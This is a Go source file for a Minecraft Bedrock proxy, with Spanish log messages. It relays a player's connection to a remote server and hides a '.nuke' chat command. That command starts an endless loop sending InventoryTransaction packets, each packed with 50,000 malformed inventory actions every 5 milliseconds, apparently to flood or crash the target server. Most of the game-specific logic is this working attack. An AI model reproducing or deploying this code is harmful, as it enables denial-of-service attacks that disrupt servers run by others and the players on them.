package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/pelletier/go-toml"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/auth"
	"github.com/sandertv/gophertunnel/minecraft/protocol"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"github.com/sirupsen/logrus"
	"golang.org/x/oauth2"
)

const COUNT = 50000

var addr string

func main() {
	config := readConfig()
	src := tokenSource()

	p, err := minecraft.NewForeignStatusProvider(config.Connection.RemoteAddress)
	if err != nil {
		panic(err)
	}

	listener, err := minecraft.ListenConfig{
		StatusProvider: p,
	}.Listen("raknet", config.Connection.LocalAddress)
	if err != nil {
		panic(err)
	}

	log.Printf("Proxy iniciado. Conéctate a: %s", config.Connection.LocalAddress)
	log.Printf("Redirigiendo a: %s", config.Connection.RemoteAddress)

	addr = config.Connection.RemoteAddress

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Println("Cerrando el proxy...")
		listener.Close()
		os.Exit(0)
	}()

	for {
		c, err := listener.Accept()
		if err != nil {
			log.Printf("Error al aceptar conexión: %v", err)
			continue
		}
		log.Printf("Nueva conexión desde: %s", c.RemoteAddr())
		go handleConn(c.(*minecraft.Conn), listener, config, src)
	}
}

func handleConn(conn *minecraft.Conn, listener *minecraft.Listener, config config, src oauth2.TokenSource) {
	log.Printf("Iniciando conexión para: %s", conn.IdentityData().DisplayName)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	serverConn, err := minecraft.Dialer{
		TokenSource: src,
		ClientData:  conn.ClientData(),
	}.DialContext(ctx, "raknet", config.Connection.RemoteAddress)
	if err != nil {
		log.Printf("Error al conectar al servidor: %v", err)
		listener.Disconnect(conn, "No se pudo conectar al servidor")
		return
	}

	var g sync.WaitGroup
	g.Add(2)
	go func() {
		if err := conn.StartGame(serverConn.GameData()); err != nil {
			log.Printf("Error al iniciar el juego: %v", err)
			listener.Disconnect(conn, "No se pudo iniciar el juego")
		}
		g.Done()
	}()
	go func() {
		if err := serverConn.DoSpawn(); err != nil {
			log.Printf("Error al hacer spawn: %v", err)
			listener.Disconnect(conn, "No se pudo hacer spawn")
		}
		g.Done()
	}()
	g.Wait()

	log.Printf("Conexión establecida para: %s", conn.IdentityData().DisplayName)

	go func() {
		defer listener.Disconnect(conn, "Conexión perdida")
		defer serverConn.Close()
		for {
			pk, err := conn.ReadPacket()
			if err != nil {
				return
			}
			if pk, ok := pk.(*packet.Text); ok {
				if pk.Message == ".nuke" {
					go func() {
						for {
							actions := make([]protocol.InventoryAction, COUNT)
							for i := range actions {
								newAction := actions[i]
								newAction.InventorySlot = 28
								newAction.SourceType = protocol.InventoryActionSourceContainer
								newAction.WindowID = protocol.WindowIDInventory
								newAction.NewItem = protocol.ItemInstance{
									StackNetworkID: 0,
									Stack: protocol.ItemStack{
										ItemType: protocol.ItemType{
											NetworkID: 0,
										},
										BlockRuntimeID: 0,
										Count:          32,
										HasNetworkID:   true,
									},
								}
								newAction.OldItem = protocol.ItemInstance{
									StackNetworkID: 2,
									Stack: protocol.ItemStack{
										ItemType: protocol.ItemType{
											NetworkID: 2,
										},
										BlockRuntimeID: 2,
										Count:          2,
										HasNetworkID:   true,
									},
								}

								actions[i] = newAction
							}
							serverConn.WritePacket(&packet.InventoryTransaction{
								Actions:         actions,
								TransactionData: &protocol.NormalTransactionData{},
							})
							logrus.Infof("Enviando %d payloads modificados al servidor!", COUNT)
							time.Sleep(5 * time.Millisecond)
						}
					}()
				}
			}
			if err := serverConn.WritePacket(pk); err != nil {
				return
			}
		}
	}()
	go func() {
		defer serverConn.Close()
		defer listener.Disconnect(conn, "Conexión perdida")
		for {
			pk, err := serverConn.ReadPacket()
			if pk, ok := pk.(*packet.Transfer); ok {
				addr = fmt.Sprintf("%s:%d", pk.Address, pk.Port)

				pk.Address = "127.0.0.1"
				pk.Port = 19132
			}
			if err != nil {
				return
			}
			if err := conn.WritePacket(pk); err != nil {
				return
			}
		}
	}()
}

type config struct {
	Connection struct {
		LocalAddress  string
		RemoteAddress string
	}
}

func readConfig() config {
	c := config{}
	if _, err := os.Stat("config.toml"); os.IsNotExist(err) {
		f, err := os.Create("config.toml")
		if err != nil {
			log.Fatalf("Error al crear config: %v", err)
		}
		data, err := toml.Marshal(c)
		if err != nil {
			log.Fatalf("Error al codificar config por defecto: %v", err)
		}
		if _, err := f.Write(data); err != nil {
			log.Fatalf("Error al escribir config por defecto codificada: %v", err)
		}
		_ = f.Close()
	}
	data, err := os.ReadFile("config.toml")
	if err != nil {
		log.Fatalf("Error al leer config: %v", err)
	}
	if err := toml.Unmarshal(data, &c); err != nil {
		log.Fatalf("Error al decodificar config: %v", err)
	}
	if c.Connection.LocalAddress == "" {
		c.Connection.LocalAddress = "0.0.0.0:19132"
	}
	data, _ = toml.Marshal(c)
	if err := os.WriteFile("config.toml", data, 0644); err != nil {
		log.Fatalf("Error al escribir archivo config: %v", err)
	}
	return c
}

func tokenSource() oauth2.TokenSource {
	check := func(err error) {
		if err != nil {
			panic(err)
		}
	}
	token := new(oauth2.Token)
	tokenData, err := ioutil.ReadFile("token.tok")
	if err == nil {
		_ = json.Unmarshal(tokenData, token)
	} else {
		token, err = auth.RequestLiveToken()
		check(err)
	}
	src := auth.RefreshTokenSource(token)
	_, err = src.Token()
	if err != nil {
		token, err = auth.RequestLiveToken()
		check(err)
		src = auth.RefreshTokenSource(token)
	}
	tok, _ := src.Token()
	b, _ := json.Marshal(tok)
	_ = ioutil.WriteFile("token.tok", b, 0644)
	return src
}
